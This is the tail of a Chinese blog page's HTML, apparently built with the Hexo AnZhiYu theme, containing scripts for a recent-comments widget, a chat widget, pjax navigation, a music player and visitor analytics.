            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "vister@takake.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
  const isChatBtn = false
  const isChatHideShow = false

  if (isChatBtn) {
    const close = () => {
      Chatra('minimizeWidget')
      Chatra('hide')
    }

    const open = () => {
      Chatra('openChat', true)
      Chatra('show')
    }

    window.ChatraSetup = {
      startHidden: true
    }
  
    window.chatBtnFn = () => {
      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
      isShow ? close() : open()
    }
  } else if (isChatHideShow) {
    window.chatBtn = {
      hide: () => {
        Chatra('hide')
      },
      show: () => {
        Chatra('show')
      }
    }
  }

  (function(d, w, c) {
    w.ChatraID = 'MYtmap9meYHQGdDTJ'
    var s = d.createElement('script')
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments)
    }
    s.async = true
    s.src = 'https://call.chatra.io/chatra.js'
    if (d.head) d.head.appendChild(s)
  })(document, window, 'Chatra')

})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>